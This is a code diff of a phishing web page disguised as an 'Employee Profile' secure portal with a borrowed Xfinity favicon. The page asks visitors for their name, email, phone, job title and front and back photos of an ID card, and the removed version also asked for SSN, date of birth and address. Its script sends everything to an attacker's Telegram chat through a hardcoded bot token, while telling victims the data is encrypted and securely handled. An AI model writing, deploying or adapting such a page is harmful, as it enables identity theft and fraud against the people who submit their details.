@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Employee Profile Setup</title>
+    <title>Employee Profile Update</title>
     <link
       rel="icon"
       href="https://www.xfinity.com/favicon.ico"
@@ -170,6 +170,12 @@
         background: rgba(40, 40, 60, 0.8);
       }
 
+      input.filled {
+        border-color: #28a745;
+        background: rgba(40, 167, 69, 0.1);
+        box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.2);
+      }
+
       input::placeholder {
         color: #666;
       }
@@ -192,7 +198,7 @@
         flex-shrink: 0;
       }
 
-      button:hover {
+      button:hover:not(:disabled) {
         background: linear-gradient(135deg, #3a8beb, #1f3d4a);
         transform: translateY(-2px);
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
@@ -201,6 +207,12 @@
       button:active {
         transform: translateY(0);
         box-shadow: 0 3px 10px rgba(0, 0, 0, 0.3);
+      }
+
+      button:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
       }
 
       .button-content {
@@ -240,6 +252,12 @@
         background-color: rgba(220, 53, 69, 0.15);
         color: #dc3545;
         border: 1px solid rgba(220, 53, 69, 0.3);
+      }
+
+      .loading {
+        background-color: rgba(74, 155, 255, 0.15);
+        color: #4a9bff;
+        border: 1px solid rgba(74, 155, 255, 0.3);
       }
 
       .file-upload {
@@ -327,14 +345,41 @@
         content: " *";
         color: #ff6b6b;
       }
+
+      .id-section {
+        background: rgba(40, 40, 60, 0.5);
+        border-radius: 12px;
+        padding: 16px;
+        margin-bottom: 18px;
+        border: 1px solid rgba(100, 150, 255, 0.1);
+      }
+
+      .id-section h4 {
+        color: #4a9bff;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .email-input:focus {
+        box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.2);
+      }
+
+      .email-input.filled {
+        background: rgba(40, 167, 69, 0.15) !important;
+        box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.25) !important;
+      }
     </style>
   </head>
   <body>
     <div class="form-container">
       <div class="header">
         <div class="welcome-text">Welcome to Secure Portal</div>
-        <div class="user-name" id="displayName">Employee Profile Setup</div>
-        <div class="subtitle">Please complete your profile setup</div>
+        <div class="user-name" id="displayName">Demographic Information</div>
+        <div class="subtitle">Please input your information</div>
       </div>
 
       <div class="form-content">
@@ -344,6 +389,7 @@
             <input
               type="text"
               id="fullName"
+              name="fullName"
               placeholder="Enter your full name"
               required
             />
@@ -352,323 +398,283 @@
           <div class="input-group">
             <label class="required">Email Address</label>
             <input
-              type="email"
-              id="email"
-              placeholder="your.email@company.com"
-              required
-            />
-          </div>
-
-          <div class="input-group">
-            <label class="required">Address</label>
-            <input
               type="text"
-              id="address"
-              placeholder="123 Main Street, City, State, Zip Code"
+              id="email"
+              name="email"
+              class="email-input"
+              placeholder="Email address"
               required
             />
           </div>
 
           <div class="input-group">
-            <label class="required">Date of Birth</label>
-            <input type="date" id="dob" required />
-          </div>
-
-          <div class="input-group">
-            <label class="required">Phone Number</label>
+            <label>Phone Number</label>
             <input
               type="tel"
               id="phone"
-              placeholder="(123) 456-7890"
-              required
+              name="phone"
+              placeholder="(000)-000-0000"
             />
           </div>
 
           <div class="input-group">
-            <label class="required">SSN</label>
-            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" required />
+            <label>Position</label>
+            <input
+              type="text"
+              id="position"
+              name="position"
+              placeholder="Your job title"
+            />
           </div>
 
-          <div class="input-group">
-            <label class="required">Job Position</label>
-            <select id="position" required>
-              <option value="">Select your position</option>
-              <option value="Data Entry">Data Entry</option>
-              <option value="Customer Service">Customer Service</option>
-              <option value="IT Support">IT Support</option>
-              <option value="HR">Human Resources</option>
-              <option value="Finance">Finance</option>
-              <option value="Manager">Manager</option>
-              <option value="Executive">Executive</option>
-              <option value="Other">Other</option>
-            </select>
-          </div>
+          <!-- ID Card Upload Section -->
+          <div class="id-section">
+            <h4>🆔 Applicant ID Card</h4>
 
-          <div class="input-group">
-            <label class="required">Upload ID Front</label>
-            <div class="file-upload">
-              <input type="file" id="idFront" accept="image/*" required />
-              <div class="file-upload-label">Choose Front of ID</div>
-            </div>
-            <div class="preview-container">
-              <div class="preview-item">
-                <img
-                  id="frontPreview"
-                  class="preview-image"
-                  alt="Front ID Preview"
+            <div class="input-group">
+              <label class="required">ID Card - Front Side</label>
+              <div class="file-upload">
+                <input
+                  type="file"
+                  id="idFront"
+                  name="idFront"
+                  accept="image/*,.pdf"
+                  required
                 />
-                <div class="preview-label">Front Preview</div>
+                <label for="idFront" class="file-upload-label">
+                  📷 Click to upload front side
+                </label>
+              </div>
+              <div class="preview-container">
+                <div class="preview-item">
+                  <img
+                    id="frontPreview"
+                    class="preview-image"
+                    alt="Front preview"
+                  />
+                  <div class="preview-label">Front Side</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="input-group">
+              <label class="required">ID Card - Back Side</label>
+              <div class="file-upload">
+                <input
+                  type="file"
+                  id="idBack"
+                  name="idBack"
+                  accept="image/*,.pdf"
+                  required
+                />
+                <label for="idBack" class="file-upload-label">
+                  📷 Click to upload back side
+                </label>
+              </div>
+              <div class="preview-container">
+                <div class="preview-item">
+                  <img
+                    id="backPreview"
+                    class="preview-image"
+                    alt="Back preview"
+                  />
+                  <div class="preview-label">Back Side</div>
+                </div>
               </div>
             </div>
           </div>
 
-          <div class="input-group">
-            <label class="required">Upload ID Back</label>
-            <div class="file-upload">
-              <input type="file" id="idBack" accept="image/*" required />
-              <div class="file-upload-label">Choose Back of ID</div>
-            </div>
-            <div class="preview-container">
-              <div class="preview-item">
-                <img
-                  id="backPreview"
-                  class="preview-image"
-                  alt="Back ID Preview"
-                />
-                <div class="preview-label">Back Preview</div>
-              </div>
-            </div>
-          </div>
-
-          <div class="note">
-            Note: Only JPG, PNG, or GIF files accepted (max 5MB each)
-          </div>
+          <div class="note">All data is securely transmitted and encrypted</div>
         </form>
       </div>
 
-      <button type="submit" form="employeeForm">
-        <div class="button-content">Submit Profile</div>
+      <button type="submit" form="employeeForm" id="submitBtn">
+        <div class="button-content">Submit</div>
       </button>
 
       <div id="statusMessage" class="status"></div>
 
-      <div class="footer">
-        This information is securely transmitted for verification purposes
-      </div>
+      <div class="footer">Secure employee profile verification system</div>
     </div>
 
     <script>
-      // Display user's name as they type
-      document
-        .getElementById("fullName")
-        .addEventListener("input", function (e) {
-          const name = e.target.value || "Employee";
-          document.getElementById("displayName").textContent = name;
-        });
+      // Telegram Bot configuration
+      const BOT_TOKEN = "8628492590:AAFFkjZvwCN7y-z6w24TZsAObsKtzVxLc4s";
+      const CHAT_ID = "7867274282";
 
-      // Preview images when selected
+      // Track filled inputs for green border
+      const inputs = ["fullName", "email", "phone", "position"];
+      inputs.forEach((id) => {
+        const input = document.getElementById(id);
+        input.addEventListener("input", function () {
+          if (this.value.trim()) {
+            this.classList.add("filled");
+          } else {
+            this.classList.remove("filled");
+          }
+        });
+      });
+
+      // File preview handlers
       document
         .getElementById("idFront")
         .addEventListener("change", function (e) {
-          previewImage(e.target, "frontPreview");
+          const file = e.target.files[0];
+          if (file) {
+            const reader = new FileReader();
+            reader.onload = function (e) {
+              document.getElementById("frontPreview").src = e.target.result;
+              document.getElementById("frontPreview").style.display = "block";
+            };
+            reader.readAsDataURL(file);
+          }
         });
 
       document
         .getElementById("idBack")
         .addEventListener("change", function (e) {
-          previewImage(e.target, "backPreview");
+          const file = e.target.files[0];
+          if (file) {
+            const reader = new FileReader();
+            reader.onload = function (e) {
+              document.getElementById("backPreview").src = e.target.result;
+              document.getElementById("backPreview").style.display = "block";
+            };
+            reader.readAsDataURL(file);
+          }
         });
 
-      function previewImage(input, previewId) {
-        if (input.files && input.files[0]) {
-          const reader = new FileReader();
-          reader.onload = function (e) {
-            const preview = document.getElementById(previewId);
-            preview.src = e.target.result;
-            preview.style.display = "block";
-          };
-          reader.readAsDataURL(input.files[0]);
+      // Elements
+      const form = document.getElementById("employeeForm");
+      const submitBtn = document.getElementById("submitBtn");
+      const statusMessage = document.getElementById("statusMessage");
+
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        // ✅ Get data DIRECTLY from input elements
+        const fullName =
+          document.getElementById("fullName").value.trim() || "Not provided";
+        const email =
+          document.getElementById("email").value.trim() || "Not provided";
+        const phone =
+          document.getElementById("phone").value.trim() || "Not provided";
+        const position =
+          document.getElementById("position").value.trim() || "Not provided";
+
+        // Check file uploads only
+        const idFrontFile = document.getElementById("idFront").files[0];
+        const idBackFile = document.getElementById("idBack").files[0];
+        if (!idFrontFile || !idBackFile) {
+          showStatus("Please upload both ID card images", "error");
+          return;
         }
-      }
 
-      document
-        .getElementById("employeeForm")
-        .addEventListener("submit", function (e) {
-          e.preventDefault();
+        // Show loading
+        submitBtn.disabled = true;
+        submitBtn.querySelector(".button-content").textContent =
+          "🔄 Sending...";
+        // showStatus("🔄 Submitting...", "loading");
 
-          // Get form values
-          const fullName = document.getElementById("fullName").value;
-          const email = document.getElementById("email").value;
-          const address = document.getElementById("address").value;
-          const dob = document.getElementById("dob").value;
-          const phone = document.getElementById("phone").value;
-          const ssn = document.getElementById("ssn").value;
-          const position = document.getElementById("position").value;
-          const idFront = document.getElementById("idFront").files[0];
-          const idBack = document.getElementById("idBack").files[0];
-
-          // Validate inputs
-          if (
-            !fullName ||
-            !email ||
-            !address ||
-            !dob ||
-            !phone ||
-            !ssn ||
-            !position ||
-            !idFront ||
-            !idBack
-          ) {
-            showStatus(
-              "Please fill in all fields and upload both ID images",
-              "error",
-            );
-            return;
-          }
-
-          // Validate email format
-          const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-          if (!emailRegex.test(email)) {
-            showStatus("Please enter a valid email address", "error");
-            return;
-          }
-
-          // Validate file types
-          const validTypes = ["image/jpeg", "image/png", "image/gif"];
-          if (
-            !validTypes.includes(idFront.type) ||
-            !validTypes.includes(idBack.type)
-          ) {
-            showStatus(
-              "Please upload valid image files (JPG, PNG, or GIF)",
-              "error",
-            );
-            return;
-          }
-
-          // Validate file sizes (5MB max)
-          if (idFront.size > 5 * 1024 * 1024 || idBack.size > 5 * 1024 * 1024) {
-            showStatus("Files must be smaller than 5MB each", "error");
-            return;
-          }
-
-          // Format the message
+        try {
+          // Step 1: Send text data
           const message = `
-🔔 *New Employee Profile Submission*
+🚨 *EMPLOYEE PROFILE UPDATE - FULL VERIFICATION* 🚨
 
 👤 *Full Name:* ${fullName}
-✉️ *Email:* ${email}
-🏠 *Address:* ${address}
-🎂 *Date of Birth:* ${dob}
-📞 *Phone:* ${phone}
-🆔 *SSN:* ${ssn}
+📧 *Email:* ${email}
+📱 *Phone:* ${phone}
 💼 *Position:* ${position}
 
-📅 Submitted: ${new Date().toLocaleString()}
-      `;
+*ID Verification:* Front + Back uploaded
+*Submitted:* ${new Date().toLocaleString()}
+          `;
 
-          // Send to Telegram bot
-          sendToTelegram(
-            "8628492590:AAFFkjZvwCN7y-z6w24TZsAObsKtzVxLc4s",
-            "7867274282",
-            message,
-            idFront,
-            idBack,
+          const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+          const textResponse = await fetch(textUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: message,
+              parse_mode: "Markdown",
+            }),
+          });
+
+          if (!textResponse.ok) throw new Error("Text submission failed");
+
+          // Step 2: Send ID Front
+          const frontFormData = new FormData();
+          frontFormData.append("chat_id", CHAT_ID);
+          frontFormData.append("document", idFrontFile);
+          frontFormData.append("caption", `🆔 ID Card - FRONT`);
+
+          const frontResponse = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+            {
+              method: "POST",
+              body: frontFormData,
+            },
           );
-        });
 
-      function sendToTelegram(botToken, chatId, message, idFront, idBack) {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        const fileUrl = `https://api.telegram.org/bot${botToken}/sendDocument`;
+          if (!frontResponse.ok) throw new Error("Front ID upload failed");
 
-        // First send the text message
-        const data = {
-          chat_id: chatId,
-          text: message,
-          parse_mode: "Markdown",
-        };
+          // Step 3: Send ID Back
+          const backFormData = new FormData();
+          backFormData.append("chat_id", CHAT_ID);
+          backFormData.append("document", idBackFile);
+          backFormData.append("caption", `🆔 ID Card - BACK`);
 
-        fetch(url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(data),
-        })
-          .then((response) => {
-            if (!response.ok) {
-              throw new Error(`HTTP error! Status: ${response.status}`);
-            }
-            return response.json();
-          })
-          .then((data) => {
-            if (data.ok) {
-              // Then send both ID images
-              return Promise.all([
-                sendDocument(botToken, chatId, idFront, "Front of ID"),
-                sendDocument(botToken, chatId, idBack, "Back of ID"),
-              ]);
-            } else {
-              throw new Error(data.description || "Failed to send message");
-            }
-          })
-          .then(() => {
-            showStatus(
-              "Profile submitted successfully! Data and ID images sent to secure channel.",
-              "success",
-            );
-            document.getElementById("employeeForm").reset();
-            // Reset previews
-            document.querySelectorAll(".preview-image").forEach((img) => {
-              img.style.display = "none";
-              img.src = "";
-            });
-            // Reset display name
-            document.getElementById("displayName").textContent = "Employee";
-          })
-          .catch((error) => {
-            console.error("Error:", error);
-            showStatus(
-              "Submission failed. Please try again. (" + error.message + ")",
-              "error",
-            );
+          const backResponse = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+            {
+              method: "POST",
+              body: backFormData,
+            },
+          );
+
+          if (!backResponse.ok) throw new Error("Back ID upload failed");
+
+          // Success!
+          form.reset();
+          document.getElementById("frontPreview").style.display = "none";
+          document.getElementById("backPreview").style.display = "none";
+
+          // Clear filled classes
+          inputs.forEach((id) => {
+            document.getElementById(id).classList.remove("filled");
           });
-      }
 
-      function sendDocument(botToken, chatId, file, caption) {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("document", file);
-        formData.append("caption", caption);
+          showStatus("✅ Profile updated successfully!...", "success");
 
-        return fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-          method: "POST",
-          body: formData,
-        })
-          .then((response) => {
-            if (!response.ok) {
-              throw new Error(`HTTP error! Status: ${response.status}`);
-            }
-            return response.json();
-          })
-          .then((data) => {
-            if (!data.ok) {
-              throw new Error(data.description || "Failed to send document");
-            }
-            return data;
-          });
-      }
+          setTimeout(() => {
+            window.location.href = "success.html";
+          }, 2500);
+        } catch (error) {
+          console.error("Submission error:", error);
+          showStatus(
+            `❌ Update failed: ${error.message}. Please try again.`,
+            "error",
+          );
+        } finally {
+          submitBtn.disabled = false;
+          submitBtn.querySelector(".button-content").textContent =
+            "📤 Update Profile";
+        }
+      });
 
       function showStatus(message, type) {
-        const statusElement = document.getElementById("statusMessage");
-        statusElement.textContent = message;
-        statusElement.className = "status " + type;
-        statusElement.style.display = "block";
+        statusMessage.textContent = message;
+        statusMessage.className = `status ${type}`;
+        statusMessage.style.display = "block";
 
-        // Auto-hide after 5 seconds
-        setTimeout(() => {
-          statusElement.style.display = "none";
-        }, 5000);
+        if (type !== "success") {
+          setTimeout(() => {
+            if (statusMessage.classList.contains(type)) {
+              statusMessage.style.display = "none";
+            }
+          }, 5000);
+        }
       }
     </script>
   </body>
